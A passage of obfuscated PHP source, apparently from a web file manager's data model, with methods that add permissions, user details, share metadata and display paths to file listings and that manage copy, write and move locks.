(isset($É€¿ù¦[$’ğÁˆöª[$Éî™üè€[411]]])) { $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[490]] = 1; $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[491]] = $É€¿ù¦[$’ğÁˆöª[$Éî™üè€[411]]][$Éî™üè€[32]]; } if ($¤Ô‰Æ·ü && $°¾—¤÷½ && isset($¤Ô‰Æ·ü[$’ğÁˆöª[$Éî™üè€[411]]])) { $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[492]] = array(); foreach ($¤Ô‰Æ·ü[$’ğÁˆöª[$Éî™üè€[411]]] as $­İğ™ùõ) { $¯£Ô£¬¾ = $°¾—¤÷½[$­İğ™ùõ]; $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[492]][] = array($Éî™üè€[493] => $¯£Ô£¬¾[$Éî™üè€[408]], $Éî™üè€[429] => $¯£Ô£¬¾[$Éî™üè€[32]], $Éî™üè€[494] => $¯£Ô£¬¾[$Éî™üè€[495]]); } } if ($µ«ğÆœá && isset($µ«ğÆœá[$’ğÁˆöª[$Éî™üè€[411]]])) { $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[496]] = array(); foreach ($µ«ğÆœá[$’ğÁˆöª[$Éî™üè€[411]]] as $õÁ„´˜¼) { $’ğÁˆöª[$Éî™üè€[96]][$Éî™üè€[496]] = array($Éî™üè€[497] => $õÁ„´˜¼[$Éî™üè€[498]], $Éî™üè€[499] => $õÁ„´˜¼[$Éî™üè€[500]], $Éî™üè€[501] => $õÁ„´˜¼[$Éî™üè€[411]], $Éî™üè€[502] => $õÁ„´˜¼[$Éî™üè€[503]], $Éî™üè€[504] => $õÁ„´˜¼[$Éî™üè€[505]], $Éî™üè€[506] => $õÁ„´˜¼[$Éî™üè€[506]], $Éî™üè€[507] => $õÁ„´˜¼[$Éî™üè€[507]]); } } } unset($’ğÁˆöª); return $×É¯Ì; } protected function _listAppendChildren(&$¨ßé›ØŒ, $«ıŠ­â) { $ØÂ‹ıÜ¿ =& $_SERVER[ñ÷§¡å]; $â’òÒË¿ = array(); $Ë¬ªáÆ… = array($ØÂ‹ıÜ¿[217] => 0, $ØÂ‹ıÜ¿[218] => 0); foreach ($¨ßé›ØŒ as &$÷ò±Ğª¥) { if (!$÷ò±Ğª¥[$ØÂ‹ıÜ¿[419]]) { continue; } $â’òÒË¿[] = $÷ò±Ğª¥[$ØÂ‹ıÜ¿[411]]; } unset($÷ò±Ğª¥); if (!$â’òÒË¿) { return; } $Ç‹‚”ã­ = array($ØÂ‹ıÜ¿[441] => array($ØÂ‹ıÜ¿[7], $â’òÒË¿), $ØÂ‹ıÜ¿[440] => 0); $«˜Á²Ú = array($ØÂ‹ıÜ¿[441], $ØÂ‹ıÜ¿[419], $ØÂ‹ıÜ¿[508] => $ØÂ‹ıÜ¿[509]); $òşäûô = $this->field($«˜Á²Ú)->where($Ç‹‚”ã­)->group($ØÂ‹ıÜ¿[510])->select(); $êæ¡è¨ = array(); foreach ($òşäûô as $•÷´©Ñâ) { $À¶¶ÖÃ = $•÷´©Ñâ[$ØÂ‹ıÜ¿[441]]; $¤Ë“òº = $•÷´©Ñâ[$ØÂ‹ıÜ¿[419]] == $ØÂ‹ıÜ¿[98] ? $ØÂ‹ıÜ¿[218] : $ØÂ‹ıÜ¿[217]; if (!isset($êæ¡è¨[$À¶¶ÖÃ])) { $êæ¡è¨[$À¶¶ÖÃ] = array($ØÂ‹ıÜ¿[217] => 0, $ØÂ‹ıÜ¿[218] => 0); } $êæ¡è¨[$À¶¶ÖÃ][$¤Ë“òº] += $•÷´©Ñâ[$ØÂ‹ıÜ¿[509]]; } foreach ($¨ßé›ØŒ as &$÷ò±Ğª¥) { if (!$÷ò±Ğª¥[$ØÂ‹ıÜ¿[419]]) { continue; } $Ÿİ¸ñÙ¼ = is_array($êæ¡è¨[$÷ò±Ğª¥[$ØÂ‹ıÜ¿[411]]]) ? $êæ¡è¨[$÷ò±Ğª¥[$ØÂ‹ıÜ¿[411]]] : $Ë¬ªáÆ…; $÷ò±Ğª¥[$ØÂ‹ıÜ¿[218]] = $Ÿİ¸ñÙ¼[$ØÂ‹ıÜ¿[218]]; $÷ò±Ğª¥[$ØÂ‹ıÜ¿[217]] = $Ÿİ¸ñÙ¼[$ØÂ‹ıÜ¿[217]]; unset($÷ò±Ğª¥[$ØÂ‹ıÜ¿[421]]); } unset($÷ò±Ğª¥); } protected function _listAppendAuth(&$Ÿ§¹’ı½) { $üÈÓ•ˆ× =& $_SERVER[ñ÷§¡å]; if (!defined($üÈÓ•ˆ×[484])) { return; } $­”µ¹ş = array(); foreach ($Ÿ§¹’ı½ as $«Æ¼ĞÉ) { if ($«Æ¼ĞÉ[$üÈÓ•ˆ×[420]] == self::TYPE_GROUP) { $­”µ¹ş[] = $«Æ¼ĞÉ[$üÈÓ•ˆ×[411]]; } } if (!$­”µ¹ş) { return; } $ “ºçŞ = array_to_keyvalue($Ÿ§¹’ı½, $üÈÓ•ˆ×[411]); $€³­´İ‡ = Model($üÈÓ•ˆ×[511])->getSourceList($­”µ¹ş, $ “ºçŞ); $Ÿ‡ö‹—ˆ = $GLOBALS[$üÈÓ•ˆ×[512]] == 1; foreach ($Ÿ§¹’ı½ as $‰ÇËª => &$«Æ¼ĞÉ) { $«Æ¼ĞÉ[$üÈÓ•ˆ×[422]] = $€³­´İ‡[$«Æ¼ĞÉ[$üÈÓ•ˆ×[411]]]; if (!$«Æ¼ĞÉ[$üÈÓ•ˆ×[422]] && $«Æ¼ĞÉ[$üÈÓ•ˆ×[420]] == self::TYPE_GROUP) { $«Æ¼ĞÉ[$üÈÓ•ˆ×[422]] = Action($üÈÓ•ˆ×[513])->pathGroupAuthMake($«Æ¼ĞÉ[$üÈÓ•ˆ×[514]]); if (!$«Æ¼ĞÉ[$üÈÓ•ˆ×[422]] && !$Ÿ‡ö‹—ˆ) { $«Æ¼ĞÉ[$üÈÓ•ˆ×[212]] = !1; $«Æ¼ĞÉ[$üÈÓ•ˆ×[211]] = !1; } } if ($«Æ¼ĞÉ[$üÈÓ•ˆ×[422]]) { $«Æ¼ĞÉ[$üÈÓ•ˆ×[212]] = AuthModel::authCheckEdit($«Æ¼ĞÉ[$üÈÓ•ˆ×[422]][$üÈÓ•ˆ×[423]]); $«Æ¼ĞÉ[$üÈÓ•ˆ×[211]] = AuthModel::authCheckView($«Æ¼ĞÉ[$üÈÓ•ˆ×[422]][$üÈÓ•ˆ×[423]]); } $this->groupPathDisplay($«Æ¼ĞÉ); } unset($«Æ¼ĞÉ); } public function _listAppendAuthSecret(&$ï‚€Õº¥) { $ŠĞÓûÈ© =& $_SERVER[ñ÷§¡å]; if (Model($ŠĞÓûÈ©[444])->get($ŠĞÓûÈ©[515]) != $ŠĞÓûÈ©[98]) { return; } static $¤É€ğİœ = false; if (!$¤É€ğİœ) { $å¨Üç‡Û = Model($ŠĞÓûÈ©[516]); $‚è±ô‡ñ = Model($ŠĞÓûÈ©[517]); $¤É€ğİœ = $‚è±ô‡ñ->listData(); $¤É€ğİœ = array_to_keyvalue($¤É€ğİœ, $ŠĞÓûÈ©[411]); $µÈÑíñ = json_decode(Model($ŠĞÓûÈ©[444])->get($ŠĞÓûÈ©[518]), !0); $µÈÑíñ = array_to_keyvalue($µÈÑíñ, $ŠĞÓûÈ©[408]); foreach ($¤É€ğİœ as $ÈûÈÚëã => $ğè†ˆş) { $¥Î½‹² = $µÈÑíñ[$ğè†ˆş[$ŠĞÓûÈ©[519]]]; if (!$¥Î½‹²) { $‚è±ô‡ñ->remove($ğè†ˆş[$ŠĞÓûÈ©[408]]); unset($¤É€ğİœ[$ÈûÈÚëã]); continue; } $ÏÍ¬ğ¼Ù = $å¨Üç‡Û->listData($¥Î½‹²[$ŠĞÓûÈ©[422]]); if (!$ÏÍ¬ğ¼Ù) { $‚è±ô‡ñ->remove($ğè†ˆş[$ŠĞÓûÈ©[408]]); unset($¤É€ğİœ[$ÈûÈÚëã]); continue; } $ğè†ˆş[$ŠĞÓûÈ©[422]] = $ÏÍ¬ğ¼Ù; $ğè†ˆş[$ŠĞÓûÈ©[520]] = $¥Î½‹²; $ğè†ˆş[$ŠĞÓûÈ©[521]] = Model($ŠĞÓûÈ©[522])->getInfoSimpleOuter($ğè†ˆş[$ŠĞÓûÈ©[463]]); $¤É€ğİœ[$ÈûÈÚëã] = $ğè†ˆş; } } $ßìÒœúŠ = defined($ŠĞÓûÈ©[523]) ? USER_ID : $ŠĞÓûÈ©[12]; $ì‘ŒãÅâ = array(); $±£ò« É = $this->_listAppendPath($ì‘ŒãÅâ, !0); foreach ($ï‚€Õº¥ as $ÈûÈÚëã => &$ğè†ˆş) { if (!is_array($ğè†ˆş[$ŠĞÓûÈ©[422]])) { continue; } if ($ğè†ˆş[$ŠĞÓûÈ©[420]] != $ŠĞÓûÈ©[524]) { continue; } if (isset($¤É€ğİœ[$ğè†ˆş[$ŠĞÓûÈ©[411]]])) { $¿À¿õ¤Í = $¤É€ğİœ[$ğè†ˆş[$ŠĞÓûÈ©[411]]]; if (!is_array($ğè†ˆş[$ŠĞÓûÈ©[475]])) { $ğè†ˆş[$ŠĞÓûÈ©[475]] = array(); } $ğè†ˆş[$ŠĞÓûÈ©[475]][$ŠĞÓûÈ©[525]] = $¿À¿õ¤Í[$ŠĞÓûÈ©[519]]; $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[526]] = $¿À¿õ¤Í; $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[527]] = $ğè†ˆş[$ŠĞÓûÈ©[528]]; $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[529]] = $ŠĞÓûÈ©[98]; if ($¿À¿õ¤Í[$ŠĞÓûÈ©[463]] != $ßìÒœúŠ) { $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[423]] = $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[423]] & $¿À¿õ¤Í[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[422]]; } continue; } $ş™§¾Å¸ = $this->parentLevelArray($ğè†ˆş[$ŠĞÓûÈ©[530]]); $Ö¾…ñÇ = array_reverse($ş™§¾Å¸); foreach ($Ö¾…ñÇ as $ÇĞ÷İØõ => $ĞÏŞ×­Ó) { if (!isset($¤É€ğİœ[$ĞÏŞ×­Ó])) { continue; } $¿À¿õ¤Í = $¤É€ğİœ[$ĞÏŞ×­Ó]; $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[526]] = $¿À¿õ¤Í; if ($¿À¿õ¤Í[$ŠĞÓûÈ©[463]] != $ßìÒœúŠ) { $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[423]] = $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[423]] & $¿À¿õ¤Í[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[422]]; } $Ç®“äÎ€ = $ŠĞÓûÈ©[12]; $ÄÀ‡“ê = count($ş™§¾Å¸) - $ÇĞ÷İØõ; for ($èúÌ’¿‰ = 0; $èúÌ’¿‰ < $ÄÀ‡“ê; $èúÌ’¿‰++) { if (!isset($±£ò« É[$ş™§¾Å¸[$èúÌ’¿‰]])) { $Ç®“äÎ€ = $ŠĞÓûÈ©[12]; break; } $Ç®“äÎ€ = $Ç®“äÎ€ . rtrim($±£ò« É[$ş™§¾Å¸[$èúÌ’¿‰]], $ŠĞÓûÈ©[8]) . $ŠĞÓûÈ©[8]; } $ğè†ˆş[$ŠĞÓûÈ©[422]][$ŠĞÓûÈ©[527]] = rtrim($Ç®“äÎ€, $ŠĞÓûÈ©[8]) . $ŠĞÓûÈ©[8]; break; } } unset($ğè†ˆş); } public function groupPathDisplay(&$“ñÎ¤¨) { $ì«„è™ =& $_SERVER[ñ÷§¡å]; if ($“ñÎ¤¨[$ì«„è™[420]] != self::TYPE_GROUP) { return; } $â€éÓï” = Model($ì«„è™[531])->getInfo($“ñÎ¤¨[$ì«„è™[514]]); $¢Äº¾‰® = $this->parentLevelArray($â€éÓï”[$ì«„è™[530]]); $šï½é¢— = $ì«„è™[12]; foreach ($¢Äº¾‰® as $”€à”ò) { $Ş…áú·É = Model($ì«„è™[531])->getInfo($”€à”ò); $šï½é¢— .= $Ş…áú·É[$ì«„è™[96]][$ì«„è™[411]] . $ì«„è™[50]; } $“ñÎ¤¨[$ì«„è™[532]] = $â€éÓï”[$ì«„è™[441]]; $“ñÎ¤¨[$ì«„è™[533]] = $â€éÓï”[$ì«„è™[530]]; $“ñÎ¤¨[$ì«„è™[534]] = $â€éÓï”[$ì«„è™[535]]; $“ñÎ¤¨[$ì«„è™[536]] = $šï½é¢— . $â€éÓï”[$ì«„è™[96]][$ì«„è™[411]]; } protected function _listAppendPath(&$Ä¼ëÊ, $„û¡£µ¹ = false) { $Ş ìï¬¾ =& $_SERVER[ñ÷§¡å]; static $êÔ²¼¸ = array(); $°´Ô•ç = array(); $úĞü‰Õ’ = array(); if ($„û¡£µ¹) { return $êÔ²¼¸; } foreach ($Ä¼ëÊ as &$½‰Õ£ìå) { $Äñ­º°» = $½‰Õ£ìå[$Ş ìï¬¾[411]]; if ($½‰Õ£ìå[$Ş ìï¬¾[419]] == $Ş ìï¬¾[98] && $½‰Õ£ìå[$Ş ìï¬¾[441]] != 0) { $êÔ²¼¸[$Äñ­º°»] = $½‰Õ£ìå[$Ş ìï¬¾[32]]; } if ($½‰Õ£ìå[$Ş ìï¬¾[419]] == $Ş ìï¬¾[98] && $½‰Õ£ìå[$Ş ìï¬¾[441]] == 0 && !isset($êÔ²¼¸[$Äñ­º°»])) { $êÔ²¼¸[$Äñ­º°»] = $this->_listAppendPathRoot($½‰Õ£ìå, array()); } if (isset($úĞü‰Õ’[$½‰Õ£ìå[$Ş ìï¬¾[530]]])) { continue; } $úĞü‰Õ’[$½‰Õ£ìå[$Ş ìï¬¾[530]]] = !0; $Ñõ¹†Û = $this->parentLevelArray($½‰Õ£ìå[$Ş ìï¬¾[530]]); foreach ($Ñõ¹†Û as $¬í²´ï => $ö­µ«¨¸) { if (isset($êÔ²¼¸[$ö­µ«¨¸])) { continue; } if ($¬í²´ï == 0) { $êÔ²¼¸[$ö­µ«¨¸] = $this->_listAppendPathRoot($½‰Õ£ìå, $Ñõ¹†Û); } if ($¬í²´ï != 0) { $°´Ô•ç[] = $ö­µ«¨¸; } } } unset($½‰Õ£ìå); $°´Ô•ç = array_unique($°´Ô•ç); if (count($°´Ô•ç) > 0) { $‚ÎÄù¥ó = array($Ş ìï¬¾[426] => array($Ş ìï¬¾[427], $°´Ô•ç)); if (count($°´Ô•ç) == 1) { $‹¸ùóˆ³ = $this->sourceInfo($°´Ô•ç[0]); $¦å¡İ—Å = is_array($‹¸ùóˆ³) ? array($‹¸ùóˆ³) : !1; } else { $¦å¡İ—Å = $this->field($Ş ìï¬¾[537])->where($‚ÎÄù¥ó)->select(); } if (!$¦å¡İ—Å) { $¦å¡İ—Å = array(); } foreach ($¦å¡İ—Å as $×ˆòÕ‡ä) { $êÔ²¼¸[$×ˆòÕ‡ä[$Ş ìï¬¾[411]]] = $×ˆòÕ‡ä[$Ş ìï¬¾[32]]; } } $ÌöÉí¨ñ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $»è¢è…ı = array(); foreach ($Ä¼ëÊ as &$½‰Õ£ìå) { $¤ïüğÖ = $½‰Õ£ìå[$Ş ìï¬¾[530]]; $şîî³ÒÙ = $Ş ìï¬¾[12]; if (isset($»è¢è…ı[$¤ïüğÖ])) { $şîî³ÒÙ = $»è¢è…ı[$¤ïüğÖ]; } else { $Ñõ¹†Û = $this->parentLevelArray($½‰Õ£ìå[$Ş ìï¬¾[530]]); foreach ($Ñõ¹†Û as $¬í²´ï => $ö­µ«¨¸) { if (isset($êÔ²¼¸[$ö­µ«¨¸])) { $şîî³ÒÙ .= $êÔ²¼¸[$ö­µ«¨¸] . $Ş ìï¬¾[8]; } } $»è¢è…ı[$¤ïüğÖ] = $şîî³ÒÙ; } $şîî³ÒÙ .= $½‰Õ£ìå[$Ş ìï¬¾[32]]; if ($½‰Õ£ìå[$Ş ìï¬¾[419]] == $Ş ìï¬¾[98]) { $şîî³ÒÙ .= $Ş ìï¬¾[8]; } $½‰Õ£ìå[$Ş ìï¬¾[528]] = str_replace($Ş ìï¬¾[538], $Ş ìï¬¾[8], $şîî³ÒÙ); if ($½‰Õ£ìå[$Ş ìï¬¾[441]] == $Ş ìï¬¾[207]) { $½‰Õ£ìå[$Ş ìï¬¾[32]] = trim($êÔ²¼¸[$½‰Õ£ìå[$Ş ìï¬¾[411]]], $Ş ìï¬¾[8]); $½‰Õ£ìå[$Ş ìï¬¾[528]] = $½‰Õ£ìå[$Ş ìï¬¾[32]] . $Ş ìï¬¾[8]; } if (intval($½‰Õ£ìå[$Ş ìï¬¾[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($½‰Õ£ìå, $Ñõ¹†Û, $ÌöÉí¨ñ); } } unset($½‰Õ£ìå); return $Ä¼ëÊ; } private function _listAppendPathRecycle(&$‰±Î¢«œ, $Ğ®¡Í›’, $ƒâÑ«Ê“) { $€Îõ½õ =& $_SERVER[ñ÷§¡å]; if (!in_array($ƒâÑ«Ê“, $Ğ®¡Í›’) && $‰±Î¢«œ[$€Îõ½õ[411]] != $ƒâÑ«Ê“) { return; } $úÚÑ”ä = explode($€Îõ½õ[8], trim($‰±Î¢«œ[$€Îõ½õ[528]], $€Îõ½õ[8])); $™ë•õøº = implode($€Îõ½õ[8], array_slice($úÚÑ”ä, 2)); $‰±Î¢«œ[$€Îõ½õ[528]] = $€Îõ½õ[8] . LNG($€Îõ½õ[539]) . $€Îõ½õ[8] . ltrim($™ë•õøº, $€Îõ½õ[8]); $‰±Î¢«œ[$€Îõ½õ[530]] = $€Îõ½õ[540] . implode($€Îõ½õ[50], array_slice($Ğ®¡Í›’, 1)) . $€Îõ½õ[50]; if ($‰±Î¢«œ[$€Îõ½õ[411]] == $ƒâÑ«Ê“) { $‰±Î¢«œ[$€Îõ½õ[530]] = $€Îõ½õ[540]; $‰±Î¢«œ[$€Îõ½õ[441]] = $€Îõ½õ[207]; $‰±Î¢«œ[$€Îõ½õ[32]] = LNG($€Îõ½õ[539]); } $‰±Î¢«œ[$€Îõ½õ[541]] = $€Îõ½õ[542]; } protected function _listAppendPathRoot(&$úÕşÛÄÅ, $¦±Ùû¼€) { $Üâõ´ªÔ =& $_SERVER[ñ÷§¡å]; static $¾Ÿ¡ÉÛ¿ = false; $ÍàòƒÍÄ = $Üâõ´ªÔ[12]; if ($úÕşÛÄÅ[$Üâõ´ªÔ[420]] == self::TYPE_USER) { if (defined($Üâõ´ªÔ[484]) && $úÕşÛÄÅ[$Üâõ´ªÔ[514]] == USER_ID) { $ÍàòƒÍÄ = LNG($Üâõ´ªÔ[543]); if ($¾Ÿ¡ÉÛ¿ === !1) { $˜áŞ‹Ô® = Model($Üâõ´ªÔ[544])->getInfoFull(USER_ID); $¾Ÿ¡ÉÛ¿ = _get($˜áŞ‹Ô®, $Üâõ´ªÔ[545], $Üâõ´ªÔ[12]); } if ($¦±Ùû¼€ && $¦±Ùû¼€[0] == $¾Ÿ¡ÉÛ¿ || !$¦±Ùû¼€ && $úÕşÛÄÅ[$Üâõ´ªÔ[411]] == $¾Ÿ¡ÉÛ¿) { $ÍàòƒÍÄ = LNG($Üâõ´ªÔ[546]); $úÕşÛÄÅ[$Üâõ´ªÔ[547]] = $Üâõ´ªÔ[548]; } if (!$¦±Ùû¼€) { $úÕşÛÄÅ[$Üâõ´ªÔ[32]] = $ÍàòƒÍÄ; } } else { $¯ü’ö = Model($Üâõ´ªÔ[522])->getInfoSimple($úÕşÛÄÅ[$Üâõ´ªÔ[514]]); $ÍàòƒÍÄ = LNG($Üâõ´ªÔ[549]) . $Üâõ´ªÔ[172] . $¯ü’ö[$Üâõ´ªÔ[32]] . $Üâõ´ªÔ[174]; $úÕşÛÄÅ[$Üâõ´ªÔ[550]] = array($Üâõ´ªÔ[32] => $¯ü’ö[$Üâõ´ªÔ[32]], $Üâõ´ªÔ[551] => $¯ü’ö[$Üâõ´ªÔ[551]], $Üâõ´ªÔ[552] => $¯ü’ö[$Üâõ´ªÔ[552]]); } } else { if ($úÕşÛÄÅ[$Üâõ´ªÔ[420]] == self::TYPE_GROUP) { $¯ü’ö = Model($Üâõ´ªÔ[531])->getInfoSimple($úÕşÛÄÅ[$Üâõ´ªÔ[514]]); $ÍàòƒÍÄ = $¯ü’ö[$Üâõ´ªÔ[32]]; } else { if ($úÕşÛÄÅ[$Üâõ´ªÔ[420]] == self::TYPE_SYSTEM) { $ÍàòƒÍÄ = $Üâõ´ªÔ[553]; } } } $ÍàòƒÍÄ = $ÍàòƒÍÄ ? $Üâõ´ªÔ[8] . $ÍàòƒÍÄ . $Üâõ´ªÔ[8] : $Üâõ´ªÔ[8]; return $ÍàòƒÍÄ; } protected function _listAppendUser(&$»åÒ–ò) { $Ä›Æ§½Ú =& $_SERVER[ñ÷§¡å]; $¯ÈòŠòÎ = array_to_keyvalue($»åÒ–ò, $Ä›Æ§½Ú[12], $Ä›Æ§½Ú[463]); $ŠÖúÙ¥† = array_to_keyvalue($»åÒ–ò, $Ä›Æ§½Ú[12], $Ä›Æ§½Ú[465]); $–†Áİƒ = array_merge($¯ÈòŠòÎ, $ŠÖúÙ¥†); $°¹¡ôüõ = Model($Ä›Æ§½Ú[544])->userListInfo($–†Áİƒ); foreach ($»åÒ–ò as &$”ùøıÚ) { $Ô¡Ù®†´ = $”ùøıÚ[$Ä›Æ§½Ú[463]]; $”ùøıÚ[$Ä›Æ§½Ú[463]] = $°¹¡ôüõ[$Ô¡Ù®†´] ? $°¹¡ôüõ[$Ô¡Ù®†´] : !1; $Ô¡Ù®†´ = $”ùøıÚ[$Ä›Æ§½Ú[465]]; $”ùøıÚ[$Ä›Æ§½Ú[465]] = $°¹¡ôüõ[$Ô¡Ù®†´] ? $°¹¡ôüõ[$Ô¡Ù®†´] : !1; if (isset($”ùøıÚ[$Ä›Æ§½Ú[475]]) && $”ùøıÚ[$Ä›Æ§½Ú[475]][$Ä›Æ§½Ú[554]]) { $ÑÙ‚ßÚ = $GLOBALS[$Ä›Æ§½Ú[6]][$Ä›Æ§½Ú[99]][$Ä›Æ§½Ú[555]]; if ($”ùøıÚ[$Ä›Æ§½Ú[475]][$Ä›Æ§½Ú[556]] <= time() - $ÑÙ‚ßÚ) { $this->metaSet($”ùøıÚ[$Ä›Æ§½Ú[411]], $Ä›Æ§½Ú[554], null); $this->metaSet($”ùøıÚ[$Ä›Æ§½Ú[411]], $Ä›Æ§½Ú[556], null); unset($”ùøıÚ[$Ä›Æ§½Ú[475]][$Ä›Æ§½Ú[554]]); continue; } $şô©ÆÎ = $”ùøıÚ[$Ä›Æ§½Ú[475]][$Ä›Æ§½Ú[554]]; $”ùøıÚ[$Ä›Æ§½Ú[475]][$Ä›Æ§½Ú[557]] = Model($Ä›Æ§½Ú[544])->getInfoSimpleOuter($şô©ÆÎ); } } unset($”ùøıÚ); } public function parentLevelArray($Öğ‘³¾ğ) { $îÈú¸À =& $_SERVER[ñ÷§¡å]; $Öğ‘³¾ğ = explode($îÈú¸À[50], trim($Öğ‘³¾ğ, $îÈú¸À[50])); return array_remove_value($Öğ‘³¾ğ, $îÈú¸À[207]); } public function listAll($’„¤Ç¯Ê) { $ı¨Á© =& $_SERVER[ñ÷§¡å]; $¡ôšæøÕ = $this->sourceInfo($’„¤Ç¯Ê); $¶ £«Ğë = array($ı¨Á©[558] => array($ı¨Á©[559], $¡ôšæøÕ[$ı¨Á©[530]] . $’„¤Ç¯Ê . $ı¨Á©[560]), $ı¨Á©[561] => 0); $İÁœ°‹Ô = $ı¨Á©[562]; $ÏÈ“÷¸Ç = "\114\105\106\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\x66\x69\x6c\x65\40\x66\151\x6c\x65\x20\x6f\156\x20\x73\x6f\165\x72\143\145\x2e\x66\151\x6c\145\x49\104\40\x3d\40\146\151\x6c\145\x2e\x66\151\x6c\x65\x49\x44"; $‚¦Ï¼äğ = $this->alias($ı¨Á©[455])->field($İÁœ°‹Ô)->where($¶ £«Ğë)->join($ÏÈ“÷¸Ç)->select(); $this->_listAppendAuth($‚¦Ï¼äğ); $this->_listAppendUser($‚¦Ï¼äğ); $this->_listAppendPath($‚¦Ï¼äğ); $‚¦Ï¼äğ = array_to_keyvalue($‚¦Ï¼äğ, $ı¨Á©[411]); $Æ£¢„ß = "\x2f{$¡ôšæøÕ[$ı¨Á©[32]]}\57"; $Æ£¢„ß = $Æ£¢„ß == $ı¨Á©[538] ? $ı¨Á©[8] : $Æ£¢„ß; $Ò±­îÆâ = array(); foreach ($‚¦Ï¼äğ as $Áñ•¯ùò => $›ì¦”ÉÔ) { $ªÀ€å§‚ = $this->parentLevelArray($›ì¦”ÉÔ[$ı¨Á©[530]]); array_shift($ªÀ€å§‚); $Ü‰ºÜ±ù = $Æ£¢„ß; for ($—‰ÄöÍÊ = 0; $—‰ÄöÍÊ < count($ªÀ€å§‚); $—‰ÄöÍÊ++) { $Ü‰ºÜ±ù .= $‚¦Ï¼äğ[$ªÀ€å§‚[$—‰ÄöÍÊ]][$ı¨Á©[32]] . $ı¨Á©[8]; } $Ü‰ºÜ±ù .= $›ì¦”ÉÔ[$ı¨Á©[32]]; if ($›ì¦”ÉÔ[$ı¨Á©[419]]) { $Ü‰ºÜ±ù .= $ı¨Á©[8]; } $Ü‰ºÜ±ù = str_replace($ı¨Á©[538], $ı¨Á©[8], $Ü‰ºÜ±ù); $Ü‰ºÜ±ù = str_replace($ı¨Á©[538], $ı¨Á©[8], $Ü‰ºÜ±ù); $óıöĞÌ¹ = array($ı¨Á©[430] => str_replace($ı¨Á©[538], $ı¨Á©[8], $Ü‰ºÜ±ù), $ı¨Á©[563] => intval($›ì¦”ÉÔ[$ı¨Á©[419]]), $ı¨Á©[96] => $this->pathInfoFilter($›ì¦”ÉÔ)); if (!$›ì¦”ÉÔ[$ı¨Á©[419]]) { $óıöĞÌ¹[$ı¨Á©[477]] = $›ì¦”ÉÔ[$ı¨Á©[477]]; $óıöĞÌ¹[$ı¨Á©[97]] = $›ì¦”ÉÔ[$ı¨Á©[94]]; } $Ò±­îÆâ[] = $óıöĞÌ¹; } return $Ò±­îÆâ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($‘â—Ë»‚) { $Ñˆñ‘¨Ç =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ñˆñ‘¨Ç[564], $‘â—Ë»‚); $ß±ùª·‰ = 1; $this->_lockEvent($‘â—Ë»‚, array($Ñˆñ‘¨Ç[565], $Ñˆñ‘¨Ç[566]), $ß±ùª·‰); $this->_lockParent($‘â—Ë»‚, array($Ñˆñ‘¨Ç[566]), $ß±ùª·‰); $this->_lockEvent($‘â—Ë»‚, array($Ñˆñ‘¨Ç[567], $Ñˆñ‘¨Ç[568]), $ß±ùª·‰); $this->_lockCheckEnd($Ñˆñ‘¨Ç[564], $‘â—Ë»‚); } public function lockCopyEnd($•©Ìœ¶¡) { $‚Ùã˜ô¨ =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $çŞ­ëîÉ = 0; $this->_lockEvent($•©Ìœ¶¡, array($‚Ùã˜ô¨[565], $‚Ùã˜ô¨[566]), $çŞ­ëîÉ); $this->_lockParent($•©Ìœ¶¡, array($‚Ùã˜ô¨[566]), $çŞ­ëîÉ); $this->_lockEvent($•©Ìœ¶¡, array($‚Ùã˜ô¨[567], $‚Ùã˜ô¨[568]), $çŞ­ëîÉ); } public function lockWriteStart($ÑÑøıšŞ, $üÇ¬½‰˜ = '') { $·Ä§ò´– =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($·Ä§ò´–[565], $ÑÑøıšŞ); $«ÅëÀ©— = 1; $this->_lockKey($·Ä§ò´–[569] . $ÑÑøıšŞ . $·Ä§ò´–[10] . $üÇ¬½‰˜, $«ÅëÀ©—); $this->_lockEvent($ÑÑøıšŞ, array($·Ä§ò´–[564], $·Ä§ò´–[566]), $«ÅëÀ©—); $this->_lockParent($ÑÑøıšŞ, array($·Ä§ò´–[564], $·Ä§ò´–[566]), $«ÅëÀ©—); $this->_lockCheckEnd($·Ä§ò´–[565], $ÑÑøıšŞ); } public function lockWriteEnd($‰Œ±¼ıô, $³‹‡Úßü = '') { $ûª³ìİ¶ =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $‹Ÿ°©ù× = 0; $this->_lockKey($ûª³ìİ¶[569] . $‰Œ±¼ıô . $ûª³ìİ¶[10] . $³‹‡Úßü, $‹Ÿ°©ù×); $this->_lockEvent($‰Œ±¼ıô, array($ûª³ìİ¶[564], $ûª³ìİ¶[566]), $‹Ÿ°©ù×); $this->_lockParent($‰Œ±¼ıô, array($ûª³ìİ¶[564], $ûª³ìİ¶[566]), $‹Ÿ°©ù×); } public function lockMoveStart($°ÊÎÈ‹) { $´ŸÛÏ½˜ =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $this->_lockCheck($´ŸÛÏ½˜[566], $°ÊÎÈ‹); $­•ò¯™Î = 1; $this->_lockKey($´ŸÛÏ½˜[570] . $°ÊÎÈ‹, $­•ò¯™Î); $this->_lockEvent($°ÊÎÈ‹, 